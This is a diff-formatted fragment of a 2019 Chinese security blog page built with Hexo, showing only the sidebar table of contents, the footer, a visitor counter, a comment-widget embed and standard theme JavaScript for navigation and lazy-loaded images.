+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">1.</span> <span class="nav-text">知识科普：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一言不合的请猛击一下下列视频"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">3.</span> <span class="nav-text">信息收集：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#null"><span class="nav-number">4.</span> <span class="nav-text">信息利用：</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2019
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
